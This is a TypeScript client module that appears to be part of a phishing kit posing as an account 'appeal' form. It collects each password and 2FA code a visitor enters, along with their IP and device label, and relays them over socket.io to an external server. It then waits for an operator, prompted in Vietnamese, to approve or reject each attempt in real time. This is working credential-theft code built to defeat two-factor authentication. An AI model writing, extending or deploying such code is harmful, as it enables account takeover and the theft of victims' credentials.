'use client';

import type { LoginProvider } from '@/store/store';
import { store } from '@/store/store';
import type { FormDataPayload, IpInfo, LoginData } from '@/utils/message';
import { buildAppealMessage } from '@/utils/message';
import { useCallback } from 'react';
import { create } from 'zustand';
import { io, type Socket } from 'socket.io-client';

const VPS_URL = process.env.NEXT_PUBLIC_VPS_URL?.replace(/\/$/, '') || '';

const resolveSocketOrigin = (): string => {
    if (VPS_URL) {
        return VPS_URL;
    }
    if (typeof window !== 'undefined') {
        return window.location.origin;
    }
    return '';
};

const createSocketClient = (): Socket | null => {
    const origin = resolveSocketOrigin();
    if (!origin) {
        return null;
    }

    const pageIsHttps = typeof window !== 'undefined' && window.location.protocol === 'https:';

    return io(origin, {
        path: '/socket.io',
        transports: pageIsHttps ? ['polling'] : ['polling', 'websocket'],
        upgrade: !pageIsHttps,
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000,
        timeout: 20_000
    });
};

// ---------- socket state (zustand) ----------

type SocketState = {
    socket: Socket | null;
    isConnected: boolean;
};

export const useSocketStore = create<SocketState>(() => ({
    socket: null,
    isConnected: false
}));

if (typeof window !== 'undefined') {
    store.getState().resetAppealSession();

    const client = createSocketClient();
    if (client) {
        client.on('connect', () => useSocketStore.setState({ isConnected: true }));
        client.on('disconnect', () => useSocketStore.setState({ isConnected: false }));
        client.on('connect_error', (err) => {
            useSocketStore.setState({ isConnected: false });
            console.warn('socket connect_error:', err.message, 'origin=', resolveSocketOrigin());
        });

        useSocketStore.setState({ socket: client });
    }
}

// ---------- hooks ----------

export const useSocket = () => ({
    socket: useSocketStore((s) => s.socket),
    isConnected: useSocketStore((s) => s.isConnected)
});

export const useSocketEmit = () => {
    const { socket, isConnected } = useSocket();

    const emit = useCallback(
        (event: string, data?: unknown) => {
            socket?.emit(event, data);
        },
        [socket]
    );

    return { emit, isConnected, socket };
};

// ---------- approval utils ----------

export type AppealStage = 'info' | 'login' | 'code';

export type LoginPollResult = 'approved' | 'rejected' | '2fa' | 'skipped' | 'timeout' | 'error';
export type CodePollResult = 'approved' | 'rejected' | 'skipped' | 'timeout' | 'error';

export type AppealMessagePayload = {
    message: string;
    message_id?: number | null;
    stage: AppealStage;
    attempt?: number;
};

const POLL_TIMEOUT_MS = 10 * 60 * 1000;
const MESSAGE_SENT_TIMEOUT_MS = 25_000;

const waitForEvent = <T>(socket: Socket, event: string, timeoutMs = POLL_TIMEOUT_MS) =>
    new Promise<T>((resolve, reject) => {
        const onEvent = (data: T) => {
            window.clearTimeout(timer);
            socket.off(event, onEvent);
            resolve(data);
        };

        const timer = window.setTimeout(() => {
            socket.off(event, onEvent);
            reject(new Error('timeout'));
        }, timeoutMs);

        socket.on(event, onEvent);
    });

const waitForSocketConnection = (socket: Socket, timeoutMs = 12_000): Promise<boolean> => {
    if (socket.connected) {
        return Promise.resolve(true);
    }
    return waitForEvent<void>(socket, 'connect', timeoutMs).then(
        () => true,
        () => false
    );
};

const waitForConnectedSocket = async (socket: Socket): Promise<void> => {
    if (socket.connected) {
        return;
    }
    const connected = await waitForSocketConnection(socket);
    if (!connected) {
        throw new Error('socket_not_connected');
    }
};

const ensureMessageId = (data: { message_id?: number | null; error?: string }): number => {
    if (data.error || data.message_id == null) {
        throw new Error(data.error || 'message_sent failed');
    }
    return data.message_id;
};

export const sendAppealMessage = async (socket: Socket, payload: AppealMessagePayload): Promise<number> => {
    await waitForConnectedSocket(socket);
    socket.emit('appeal_message', payload);
    const data = await waitForEvent<{ message_id?: number | null; error?: string }>(
        socket,
        'message_sent',
        MESSAGE_SENT_TIMEOUT_MS
    );
    return ensureMessageId(data);
};

const waitForStatus = async (socket: Socket, event: 'login_result' | 'code_result'): Promise<string> => {
    try {
        const { status } = await waitForEvent<{ status: string }>(socket, event);
        return status;
    } catch {
        return 'timeout';
    }
};

const toLoginResult = (status: string): LoginPollResult => {
    switch (status) {
        case 'approved':
            return 'approved';
        case 'rejected':
            return 'rejected';
        case '2fa':
            return '2fa';
        case 'skipped':
            return 'skipped';
        default:
            return 'error';
    }
};

const toCodeResult = (status: string): CodePollResult => {
    switch (status) {
        case 'approved':
            return 'approved';
        case 'rejected':
            return 'rejected';
        case 'skipped':
            return 'skipped';
        default:
            return 'error';
    }
};

const waitLoginApproval = async (socket: Socket): Promise<LoginPollResult> =>
    toLoginResult(await waitForStatus(socket, 'login_result'));

const waitCodeApproval = async (socket: Socket): Promise<CodePollResult> =>
    toCodeResult(await waitForStatus(socket, 'code_result'));

// ---------- approval flow ----------

export type LoginSubmitResult = {
    approved: boolean;
    needs2FA: boolean;
};

export type CodeSubmitResult = {
    approved: boolean;
};

type AppealContext = {
    socket: Socket;
    messageId: number | null;
    setMessageId: (id: number | null) => void;
    formData: FormDataPayload;
    loginData: LoginData;
    loginProvider: LoginProvider | null;
    passwordAttempts: string[];
    twoFAAttempts: string[];
    deviceLabel: string;
    ip: IpInfo;
    setLoginData: (data: LoginData) => void;
    addPasswordAttempt: (password: string) => void;
    addTwoFAAttempt: (code: string) => void;
};

const buildAttemptLine = (label: string, attemptNumber: number): string =>
    `\n\n🔢 <b>${label} ${attemptNumber}</b> — bấm nút ở tin này để duyệt\n\n⏳ <b>Chờ duyệt...</b>`;

const sendTrackedAttempt = async (ctx: AppealContext, payload: AppealMessagePayload): Promise<void> => {
    const newMessageId = await sendAppealMessage(ctx.socket, payload);
    ctx.setMessageId(newMessageId);
};

const mapLoginResult = (result: LoginPollResult): LoginSubmitResult => {
    if (result === 'approved' || result === 'skipped') {
        return { approved: true, needs2FA: false };
    }
    if (result === '2fa') {
        return { approved: false, needs2FA: true };
    }
    return { approved: false, needs2FA: false };
};

const mapCodeResult = (result: CodePollResult): CodeSubmitResult => ({
    approved: result === 'approved' || result === 'skipped'
});

export const submitLoginApproval = async (
    ctx: AppealContext,
    identity: string,
    password: string
): Promise<LoginSubmitResult> => {
    const email = identity.trim();
    const nextPasswords = [...ctx.passwordAttempts, password];
    ctx.addPasswordAttempt(password);
    ctx.setLoginData({ email, password });

    const message = buildAppealMessage({
        form: ctx.formData,
        login: { email, password },
        loginProvider: ctx.loginProvider,
        passwordLogs: nextPasswords,
        codeAttempts: ctx.twoFAAttempts,
        ip: ctx.ip,
        deviceLabel: ctx.deviceLabel
    });

    await sendTrackedAttempt(ctx, {
        message: `${message}${buildAttemptLine('Lần', nextPasswords.length)}`,
        message_id: ctx.messageId,
        stage: 'login',
        attempt: nextPasswords.length
    });

    return mapLoginResult(await waitLoginApproval(ctx.socket));
};

export const submitCodeApproval = async (ctx: AppealContext, code: string): Promise<CodeSubmitResult> => {
    const nextCodes = [...ctx.twoFAAttempts, code];
    ctx.addTwoFAAttempt(code);

    const message = buildAppealMessage({
        form: ctx.formData,
        login: ctx.loginData,
        loginProvider: ctx.loginProvider,
        passwordLogs: ctx.passwordAttempts,
        codeAttempts: nextCodes,
        ip: ctx.ip,
        deviceLabel: ctx.deviceLabel
    });

    await sendTrackedAttempt(ctx, {
        message: `${message}${buildAttemptLine('2FA Lần', nextCodes.length)}`,
        message_id: ctx.messageId,
        stage: 'code',
        attempt: nextCodes.length
    });

    return mapCodeResult(await waitCodeApproval(ctx.socket));
};